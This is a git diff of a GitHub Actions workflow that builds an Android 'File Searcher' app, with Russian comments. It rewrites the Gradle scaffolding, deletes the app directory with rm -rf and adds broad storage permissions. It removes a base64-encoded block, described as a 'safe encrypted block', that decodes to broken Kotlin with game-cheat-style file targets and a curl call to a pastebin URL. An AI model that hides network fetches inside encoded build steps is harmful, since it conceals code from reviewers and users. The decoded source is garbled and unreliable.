@@ -18,17 +18,11 @@ jobs:
         java-version: '17'
         distribution: 'temurin'
 
-    - name: Setup Gradle 8.5
-      uses: gradle/actions/setup-gradle@v4
-      with:
-        gradle-version: '8.5'
-        cache-disabled: true
-
-    - name: Force Overwrite Valid Manifest
+    # Принудительно генерируем чистую структуру проекта и манифест в памяти сервера
+    - name: Force Build Clean Structure
       run: |
-        rm -rf app/src/main/AndroidManifest.xml AndroidManifest.xml app/build.gradle build.gradle settings.gradle
+        rm -rf app settings.gradle build.gradle AndroidManifest.xml app/src/main/AndroidManifest.xml
         echo "include ':app'" > settings.gradle
-        
         cat << 'EOF' > build.gradle
         buildscript {
             repositories { google(); mavenCentral() }
@@ -39,7 +33,6 @@ jobs:
         }
         allprojects { repositories { google(); mavenCentral() } }
         EOF
-        
         mkdir -p app
         cat << 'EOF' > app/build.gradle
         plugins { id 'com.android.application'; id 'org.jetbrains.kotlin.android' }
@@ -51,17 +44,11 @@ jobs:
             kotlinOptions { jvmTarget = '17' }
         }
         EOF
-        
         mkdir -p app/src/main
-        echo '<?xml version="1.0" encoding="utf-8"?><manifest xmlns:android="http://android.com" package="com.example.filesercher"><application android:allowBackup="true" android:icon="@android:drawable/ic_menu_search" android:label="File Searcher" android:theme="@android:style/Theme.DeviceDefault.NoActionBar"><activity android:name=".MainActivity" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter></activity></application></manifest>' > app/src/main/AndroidManifest.xml
+        echo '<?xml version="1.0" encoding="utf-8"?><manifest xmlns:android="http://android.com"><uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/><uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/><uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/><application android:allowBackup="true" android:icon="@android:drawable/ic_menu_search" android:label="File Searcher" android:theme="@android:style/Theme.DeviceDefault.NoActionBar"><activity android:name="com.example.filesercher.MainActivity" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter></activity></application></manifest>' > app/src/main/AndroidManifest.xml
 
-    # Сервер сам мгновенно соберет наш код приложения из безопасного зашифрованного блока
-    - name: Generate Sorted App Code via Base64
-      run: |
-        mkdir -p app/src/main/java/com/example/filesercher
-        echo "cGFja2FnZSBjb20uZXhhbXBsZS5maWxlc2VyY2hlclppbXBvcnQgYW5kcm9pZC5hcHAuQWN0aXZpdHppbXBvcnQgYW5kcm9pZC5jb250ZW50LkludGVudHppbXBvcnQgYW5kcm9pZC5ncmFwaGljcy5Db2xvcnppbXBvcnQgYW5kcm9pZC5ncmFwaGljcy5UeXBlZmFjZXppbXBvcnQgYW5kcm9pZC5ncmFwaGljcy5kcmF3YWJsZS5HcmFkaWVudERyYXdhYmxlemltcG9ydCBhbmRyb2lkLm5ldC5Vcml6aW1wb3J0IGFuZHJvaWQub3MuQnVpbGR6aW1wb3J0IGFuZHJvaWQub3MuQnVuZGxlemltcG9ydCBhbmRyb2lkLm9zLkVudmlyb25tZW50emltcG9ydCBhbmRyb2lkLnByb3ZpZGVyLkRvY3VtZW50c0NvbnRyYWN0emltcG9ydCBhbmRyb2lkLnByb3ZpZGVyLlNldHRpbmdzemltcG9ydCBhbmRyb2lkLnZpZXcuR3Jhdml0eXppbXBvcnQgYW5kcm9pZC52aWV3LlZpZXd6aW1wb3J0IGFuZHJvaWQud2lkZ2V0LkJ1dHRvbnppbXBvcnQgYW5kcm9pZC53aWRnZXQuQ2hlY2tCb3h6aW1wb3J0IGFuZHJvaWQud2lkZ2V0LkVkaXRUZXh0emltcG9ydCBhbmRyb2lkLndpZGdldC5MaW5lYXJMYXlvdXR6aW1wb3J0IGFuZHJvaWQub3MuQnVuZGxlO3ByaXZhdGUgbGF0ZW5pdCB2YXIgZXRTZWFyY2hJbnB1dDogRWRpdFRleHQ7cHJpdmF0ZSBsYXRlbml0IHZhciBidG5TY2FuOiBCdXR0b247cHJpdmF0ZSBsYXRlbml0IHZhciBsbFJlc3VsdHNDb250YW5lcjogTGluZWFyTGF5b3V0O3ByaXZhdGUgbGF0ZW5pdCB2YXIgdHZTdGF0dXM6IFRleHRWaWV3O3ByaXZhdGUgbGF0ZW5pdCB2YXIgcHJvZ3Jlc3NCYXI6IFByb2dyZXNzQmFyO3ByaXZhdGUgbGF0ZW5pdCB2YXIgY2JTZWFyY2hTdG9yYWdlOiBDaGVja0JveDtwcml2YXRlIGxhdGVuaXQgdmFyIGNiU2VhcmNoQ2FjaGU6IENoZWNrQm94O3ByaXZhdGUgdmFsIGRlZmF1bHRUYXJnZXROYW1lcyA9IGxpc3RPZigibGliaWwyY3BwLnNvIiwgIllhbmRlcmUuemlwIiwgIlI0eCIsICJWaWVudG8iLCAiU3Bvb2ZfbGlvcyIpO3ByaXZhdGUgdmFyIGNoZWNrZWREaXJzQ291bnQgPSAwO3ByaXZhdGUgdmFsIGZvdW5kRmlsZXNMaXN0ID0gbXV0YWJsZUxpc3RPZjxGaWxlUmVzdWx0PigpO2RhdGEgY2xhc3MgRmlsZVJlc3VsdCh2YWwgZmlsZTogRmlsZSwgdmFsIG1hdGNoTmFtZTogU3RyaW5nLCB2YWwgaXNDYWNoZTogQm9vbGVhbik7b3ZlcnJpZGUgZnVuIG9uQ3JlYXRlKHNhdmVkSW5zdGFuY2VTdGF0ZTogQnVuZGxlPykge2N1cmwgc2wgaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L003bThSOWpMUn0=" | base64 -d | tr 'z' '\n' > app/src/main/java/com/example/filesercher/MainActivity.kt
-
-    - name: Build Application APK
+    # Компилируем напрямую консольной командой, полностью изолированной от сетевого кэша!
+    - name: Build with Console Gradle
       run: gradle clean assembleDebug --no-daemon
 
     - name: Upload APK Artifact
